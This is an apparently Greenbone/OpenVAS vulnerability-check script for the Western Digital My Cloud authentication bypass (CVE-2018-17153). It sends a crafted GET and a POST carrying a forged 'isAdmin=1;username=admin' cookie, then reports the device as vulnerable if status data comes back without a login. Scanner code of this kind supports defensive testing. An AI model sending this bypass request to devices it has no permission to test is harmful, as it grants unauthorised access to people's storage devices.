CPE_PREFIX = "cpe:/o:wdc";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.108305" );
	script_version( "2021-09-14T10:02:44+0000" );
	script_cve_id( "CVE-2018-17153" );
	script_bugtraq_id( 105359 );
	script_tag( name: "last_modification", value: "2021-09-14 10:02:44 +0000 (Tue, 14 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-11-30 08:00:00 +0100 (Thu, 30 Nov 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2018-12-18 14:13:00 +0000 (Tue, 18 Dec 2018)" );
	script_name( "Western Digital My Cloud Products Authentication Bypass and Remote Command Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_wd_mycloud_consolidation.sc" );
	script_mandatory_keys( "wd-mycloud/http/detected" );
	script_xref( name: "URL", value: "https://support.wdc.com/downloads.aspx?lang=en#firmware" );
	script_xref( name: "URL", value: "https://support.wdc.com/knowledgebase/answer.aspx?ID=25952" );
	script_xref( name: "URL", value: "https://blog.westerndigital.com/western-digital-my-cloud-update/" );
	script_xref( name: "URL", value: "https://www.exploitee.rs/index.php/Western_Digital_MyCloud" );
	script_xref( name: "URL", value: "https://securify.nl/nl/advisory/SFY20180102/authentication-bypass-vulnerability-in-western-digital-my-cloud-allows-escalation-to-admin-privileges.html" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/105359" );
	script_tag( name: "summary", value: "Western Digital My Cloud Products are prone to an authentication bypass and
  multiple remote command injection vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET and HTTP POST request and check the response." );
	script_tag( name: "impact", value: "Successful exploit allows an attacker to execute arbitrary commands with
  root privileges in context of the affected application." );
	script_tag( name: "solution", value: "The vendor has released firmware updates. Please see the references
  for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
require("list_array_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
CPE = infos["cpe"];
if(!CPE || ( !ContainsString( CPE, "my_cloud" ) && !ContainsString( CPE, "wd_cloud" ) )){
	exit( 0 );
}
port = infos["port"];
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/cgi-bin/network_mgr.cgi?cmd=cgi_get_ipv6&flag=1";
req = http_get( port: port, item: url );
res = http_keepalive_send_recv( port: port, data: req );
url2 = dir + "/cgi-bin/home_mgr.cgi";
data = "cmd=2";
cookie = "isAdmin=1;username=admin";
req2 = http_post_put_req( port: port, url: url2, data: data, accept_header: "application/xml, text/xml, */*; q=0.01", add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded", "Cookie", cookie ) );
res2 = http_keepalive_send_recv( port: port, data: req2, bodyonly: FALSE );
if(IsMatchRegexp( res2, "^HTTP/1\\.[01] 200" ) && ContainsString( res2, "<config>" ) && IsMatchRegexp( res2, "<(board_temperature|fan|hd_status|disk|raid|raidmode)>.*</(board_temperature|fan|hd_status|disk|raid|raidmode)>" )){
	info["\"HTTP POST\" body"] = data;
	info["Cookie"] = cookie;
	info["URL"] = http_report_vuln_url( port: port, url: url2, url_only: TRUE );
	report = "By requesting the URL:\n\n";
	report += http_report_vuln_url( port: port, url: url, url_only: TRUE );
	report += "\n\nit was possible to bypass the authententication of the remote device.\n\n";
	report += "With a follow-up request:\n\n";
	report += text_format_table( array: info ) + "\n\n";
	report += "it was possible to access the system status without a previous valid login.";
	report += "\n\nResult: " + res2;
	expert_info = "Request 1:\n" + req + "\nResponse 1 (404 HTTP status code is expected):\n" + res;
	expert_info += "Request 2:\n" + req2 + "\n\nResponse 2:\n" + res2;
	security_message( port: port, data: report, expert_info: expert_info );
	exit( 0 );
}
exit( 99 );

